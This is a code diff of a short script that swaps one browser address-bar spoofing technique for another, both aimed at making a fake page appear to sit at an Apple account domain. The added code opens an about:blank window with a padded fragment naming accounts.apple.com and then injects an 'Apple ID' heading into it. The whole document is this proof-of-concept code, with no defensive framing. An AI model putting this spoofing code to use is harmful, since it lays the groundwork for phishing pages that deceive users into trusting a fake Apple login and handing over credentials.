@@ -1,5 +1,20 @@
 <script>
-// Technique 1: Double Hash (##)
-blob = new Blob(['<html><body><h1>Double Hash</h1></body></html>'], {type: 'text/html'});
-location = URL.createObjectURL(blob) + '##https://www.account.apple.com';
+// Method 1: Window.Open + About:Blank
+function windowOpenSpoof() {
+    const target = 'https://www.accounts.apple.com';
+    const payload = 'x'.repeat(100) + '#' + target;
+    
+    // Buka new window dengan about:blank
+    const newWin = window.open('about:blank#' + payload, '_blank');
+    
+    // Modify content setelah load
+    setTimeout(() => {
+        newWin.document.body.innerHTML = `
+            <h1>🍎 Apple ID</h1>
+            <p>Address bar shows: ${target}</p>
+        `;
+    }, 100);
+}
+
+windowOpenSpoof();
 </script>
